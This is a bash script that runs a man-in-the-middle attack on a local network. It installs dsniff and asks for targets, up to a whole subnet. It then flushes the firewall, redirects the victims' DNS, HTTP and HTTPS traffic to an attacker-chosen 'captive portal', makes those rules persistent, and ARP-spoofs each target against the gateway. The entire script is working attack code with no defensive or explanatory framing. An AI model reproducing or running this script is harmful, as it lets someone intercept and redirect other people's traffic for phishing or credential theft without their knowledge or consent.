#!/bin/bash

# Install required tools (if not already installed)
sudo apt-get update
sudo apt-get install -y dsniff iptables iptables-persistent ipcalc -y

# Prompt user for network interface
read -p "Enter the network interface (e.g., wlan0): " INTERFACE

# Prompt user for captive portal IP
read -p "Enter the captive portal IP (e.g., 192.168.1.10): " PORTAL_IP

# Prompt user for device IP (to exempt)
read -p "Enter this device's IP (to exempt): " DEVICE_IP

# Prompt user for gateway IP (to exempt)
read -p "Enter the gateway IP (to exempt): " GATEWAY_IP

# Prompt user for target selection
echo "Select target(s) for redirection:"
echo "1) Single IP"
echo "2) Multiple IPs (comma-separated)"
echo "3) All IPs in a subnet"
read -p "Enter option (1-3): " TARGET_OPTION

# Initialize target IP array
declare -a TARGET_IPS

# Handle target selection
case $TARGET_OPTION in
  1)
    read -p "Enter the single target IP: " SINGLE_IP
    TARGET_IPS=("$SINGLE_IP")
    ;;
  2)
    read -p "Enter multiple target IPs (comma-separated, no spaces): " MULTIPLE_IPS
    IFS=',' read -r -a TARGET_IPS <<< "$MULTIPLE_IPS"
    ;;
  3)
    read -p "Enter the subnet (e.g., 192.168.1.0/24): " SUBNET
    # Use ipcalc to generate all IPs in the subnet
    IP_LIST=$(ipcalc "$SUBNET" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | sort -u)
    # Convert IP list to array, excluding device and gateway IPs
    while IFS= read -r ip; do
      if [[ "$ip" != "$DEVICE_IP" && "$ip" != "$GATEWAY_IP" ]]; then
        TARGET_IPS+=("$ip")
      fi
    done <<< "$IP_LIST"
    ;;
  *)
    echo "Invalid option. Exiting."
    exit 1
    ;;
esac

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush existing iptables rules
iptables -F
iptables -t nat -F

# Redirect hardcoded DNS traffic to 8.8.8.8 to captive portal
iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp -d 8.8.8.8 --dport 53 -j DNAT --to-destination "$PORTAL_IP"

# Redirect DNS traffic (UDP and TCP) to captive portal, exempting device and gateway IPs
iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp --dport 53 ! -s "$DEVICE_IP" ! -d "$GATEWAY_IP" -j DNAT --to-destination "$PORTAL_IP"
iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 53 ! -s "$DEVICE_IP" ! -d "$GATEWAY_IP" -j DNAT --to-destination "$PORTAL_IP"

# Allow access to the captive portal
iptables -t nat -A PREROUTING -i "$INTERFACE" -d "$PORTAL_IP" -j ACCEPT

# Redirect HTTP/HTTPS traffic to captive portal for target IPs
for TARGET_IP in "${TARGET_IPS[@]}"; do
  if [[ "$TARGET_IP" != "$DEVICE_IP" && "$TARGET_IP" != "$GATEWAY_IP" ]]; then
    iptables -t nat -A PREROUTING -i "$INTERFACE" -s "$TARGET_IP" -p tcp --dport 80 -j DNAT --to-destination "$PORTAL_IP"
    iptables -t nat -A PREROUTING -i "$INTERFACE" -s "$TARGET_IP" -p tcp --dport 443 -j DNAT --to-destination "$PORTAL_IP"
  fi
done

# Masquerade outgoing traffic
iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE

# Save iptables rules
iptables-save > /etc/iptables/rules.v4

# Start ARP spoofing for each target IP
for TARGET_IP in "${TARGET_IPS[@]}"; do
  if [[ "$TARGET_IP" != "$DEVICE_IP" && "$TARGET_IP" != "$GATEWAY_IP" ]]; then
    arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY_IP" &
    arpspoof -i "$INTERFACE" -t "$GATEWAY_IP" "$TARGET_IP" &
  fi
done

echo "Captive portal redirection and ARP spoofing started for selected targets."
